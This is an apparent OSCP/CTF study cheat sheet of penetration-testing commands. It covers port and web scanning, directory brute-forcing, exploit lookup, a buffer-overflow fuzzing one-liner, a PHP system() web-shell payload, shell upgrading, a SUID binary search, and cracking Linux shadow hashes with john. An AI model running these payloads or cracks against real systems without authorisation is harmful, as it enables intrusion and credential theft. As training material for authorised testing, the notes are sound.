# OSCP
OSCP / CTF

ENUM

Portscan all Ports
sudo nmap -sS -p- <ip>

Portscan with Scripts and Fingerprinting
sudo nmap -sS -sV -sC -p22,80,9000 <ip>

Web Vuln-Scan
nikto -host 192.168.56.205

Web Enum BruteForce
gobuster -t 100 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<host>
https://github.com/danielmiessler/SecLists
big wordlist:
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/dirsearch.txt
gobuster -t 100 dir -w big.txt -u http://<host>
  
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://<ip>/FUZZ -t 500
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://<ip>/config/FUZZ -t 500 -mc 200

CVE / Exploit Search
searchsploit <name>
searchsploit -p <id>
cp <path> .

Fuzzing 
python -c 'print("A" * 5000)' | nc <ip> <port>
  
php shell command
"<?php system('id'); ?>"

upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

SUID BINARY
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null

Crack Password with John
unshadow passwd.txt shadow.txt > unshadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt 
  
  

